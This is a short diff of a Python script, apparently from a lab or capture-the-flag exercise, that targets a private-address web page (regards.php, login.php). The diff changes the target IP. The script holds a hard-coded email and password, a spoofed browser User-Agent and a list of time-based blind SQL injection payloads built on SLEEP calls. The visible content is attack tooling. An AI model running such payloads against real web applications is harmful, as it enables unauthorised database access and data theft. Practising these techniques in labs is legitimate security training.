@@ -2,10 +2,10 @@ import requests
 import time
 userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
 headers={"User-Agent":userAgent}
-target = "http://10.102.1.119/regards.php?email="
+target = "http://10.102.181.239/regards.php?email="
 _email = "stefan@immersivenews.co.uk"
 password = "myRandomPassword!"
-#target = "http://10.102.1.119/login.php"
+#target = "http://10.102.181.239/login.php"
 payloads = ["' + SLEEP(10)",
             "'sleep(5)",
             "'or sleep(5)",
